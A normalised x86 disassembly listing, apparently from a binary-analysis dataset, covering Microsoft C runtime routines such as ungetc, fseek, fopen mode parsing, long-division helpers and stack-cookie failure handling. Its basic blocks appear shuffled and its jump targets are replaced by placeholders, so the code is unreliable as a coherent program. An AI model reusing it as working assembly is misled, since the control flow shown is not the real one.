cmp ebx 0x40
jne r-xdata
and edi 0xfffffffe
mov [ ebp + 0x8 ] esi
push esi
call sub_43909f
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_43bc19
push esi
call sub_440f64
pop ecx
pop ecx
and [ esi + 0xc ] 0xffffc2f3
mov ecx [ esi + 0xc ]
test bl 0x4
je r-xdata
jmp r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
or ecx 0x4
lea eax [ esi + 0x14 ]
push 0x2
pop edi
jmp r-xdata
or ecx 0x500
push edi
call sub_43ddd2
pop ecx
test eax eax
jne r-xdata
mov [ esi + 0xc ] ecx
or [ esi + 0xc ] 0x408
jmp r-xdata
inc [ rw-data ]
or [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
mov [ esi + 0x18 ] edi
mov [ esi + 0x8 ] eax
mov [ esi ] eax
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43e89b
mov eax [ ebp - 0x1c ]
sub_43e8a5
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
push esi
call sub_43917d
pop ecx
mov edx rw-data
cmp eax edi
je r-xdata
mov eax edi
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al al
jns r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp eax edi
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_44b922
pop ecx
test al 0x2
jne r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
jmp r-xdata
sub_43e988
push 0xc
push r--data
call sub_43f8e0
xor eax eax
cmp [ ebp + 0xc ] eax
setne al
test eax eax
jne r-xdata
push [ ebp + 0xc ]
call sub_43909f
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43e8a5
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43e9e7
mov eax [ ebp - 0x1c ]
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
call sub_43f925
retn
sub_43e9f1
push 0xc
push r--data
call sub_43f8e0
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_43909f
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_43917d
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_43f925
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43eadd
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
push esi
call sub_4402a7
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_43eae5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
pop ebp
retn
push [ ebp + 0x8 ]
call sub_44bcb5
pop ecx
mov ecx eax
mov [ esi ] eax
and ecx edx
or eax 0xffffffff
mov [ esi + 0x4 ] edx
cmp ecx eax
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
sub_43eb40
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
push edi
test al 0x83
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
and eax 0xffffffef
mov [ esi + 0xc ] eax
cmp edi 0x1
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_43bc19
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_44b96b
add [ ebp + 0xc ] eax
pop ecx
adc [ ebp + 0x10 ] edx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_43917d
pop ecx
push eax
call sub_44bda7
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
test al 0x8
je r-xdata
or eax 0xffffffff
xor eax eax
jmp r-xdata
test eax 0x400
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi + 0x18 ] 0x200
sub_43ebdc
push 0xc
push r--data
call sub_43f8e0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_43909f
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43eb40
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43ec51
mov eax [ ebp - 0x1c ]
cmp esi 0x1
je r-xdata
call sub_43f925
retn
cmp esi 0x2
jne r-xdata
sub_43ec5b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
pop ebp
retn
push 0x0
push [ eax + 0x4 ]
push [ eax ]
push [ ebp + 0x8 ]
call sub_43ebdc
add esp 0x10
pop ebp
retn
sub_43ec96
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_438ce6
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_43c04c
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_44b5f1
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_448086
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_43e133
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_43edab
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_43ec96
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_43ede0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_43ee50
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_43ee84
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x34 ]
mov esi ebx
call sub_438ce6
test edi edi
je r-xdata
test ebx ebx
jne r-xdata
mov [ edi ] ebx
mov eax [ ebp - 0x34 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x28 ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x34 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_448086
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x2c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_44bea0
add esp 0xc
mov ecx eax
test edi edi
je r-xdata
inc esi
jmp r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
mov eax [ ecx ]
test eax 0x240
je r-xdata
mov eax [ ecx + 0x4 ]
add eax esi
mov [ edi ] eax
test al 0x81
je r-xdata
fldz
fstp [ ebp - 0x24 ]
test edi edi
je r-xdata
test eax 0x100
je r-xdata
cmp [ esi ] 0x2d
fld [ rw-data ]
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov [ edi ] ebx
jmp r-xdata
fld [ ecx + 0x10 ]
fstp [ ebp - 0x24 ]
fld [ ecx + 0x10 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
fstp [ ebp - 0x24 ]
call sub_43c04c
mov [ eax ] 0x22
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x24 ]
mov eax [ ebp - 0x2c ]
and [ eax + 0x70 ] 0xfffffffd
fstp st0
sub_43efbe
call sub_43b7bf
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_43b7cc
pop ecx
push 0x3
call sub_43b718
int3
push 0x1
push 0x40000015
push 0x3
call sub_43f74a
add esp 0xc
sub_43eff1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_43f012
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_44bf47
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_44bf47
pop ecx
sub_43f118
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_43c04c
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_43c04c
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_43f8c5
mov eax esi
jmp r-xdata
sub_43f28a
push 0xc
push r--data
call sub_43f8e0
push 0xe
call sub_442c68
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43f2f1
call sub_43f925
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_4381f8
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_4381f8
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_43f309
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_43f34f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor edx edx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
add esi 0x2
movzx eax [ esi ]
cmp eax 0x61
je r-xdata
mov ebx 0x109
cmp eax 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
lea edi [ ecx + 0x7f ]
mov edx 0x4000
xor ebx ebx
or [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp eax 0x77
je r-xdata
add esi 0x2
xor edi edi
cmp [ esi ] di
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
movzx eax ax
cmp eax 0x53
jg r-xdata
add esi 0x2
movzx eax [ esi ]
xor ecx ecx
inc ecx
push edi
cmp ax dx
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
xor eax eax
jmp r-xdata
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_44c748
add esp 0x14
test eax eax
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
jmp r-xdata
push 0x20
pop edi
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] edi
mov [ eax ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0x1c ] edi
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
cmp [ esi ] di
je r-xdata
mov eax 0x1000
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
pop edi
add esi 0x2
push 0x3
push esi
push r--data
call sub_44c8eb
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x20
jmp r-xdata
add esi 0x2
movzx eax [ esi ]
test ax ax
jne r-xdata
sub eax 0xb
je r-xdata
add esi 0x6
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] di
je r-xdata
or [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
and ebx 0xfffffffe
and eax 0xfffffffc
or ebx 0x2
or eax edi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
add esi 0x2
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
add esi 0x2
cmp [ esi ] di
je r-xdata
or ebx edx
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx edi
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_44c84d
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_44c84d
add esp 0xc
test eax eax
jne r-xdata
add esi 0xa
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_44c84d
add esp 0xc
test eax eax
jne r-xdata
add esi 0x10
or ebx 0x20000
jmp r-xdata
add esi 0xe
or ebx 0x10000
jmp r-xdata
sub_43f608
push 0x10
push r--data
call sub_43f8e0
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_442c68
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43f732
mov eax edi
call sub_43f925
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
push 0x38
call sub_43ddd2
pop ecx
mov ecx [ rw-data ]
mov [ ecx + esi * 4 ] eax
cmp eax ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ eax + esi * 4 ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ eax + esi * 4 ]
call sub_4381f8
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_4390e0
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_442ba6
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_43914e
pop ecx
pop ecx
sub_43f74a
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_43a820
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_44bf47
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_44bf47
pop ecx
sub_43f873
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_43f74a
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_43f898
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43f873
int3
pop ebp
jmp eax
sub_43f8e0
push sub_43f940
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_43f940
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_437c1c
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_437c1c
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_43fc0b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_43fbc2
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_437c1c
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_437c1c
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_43fbf2
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_43fc0b
mov eax [ ebp + 0xc ]
push r--data
call sub_44a5e0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_437c1c
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_43fbd9
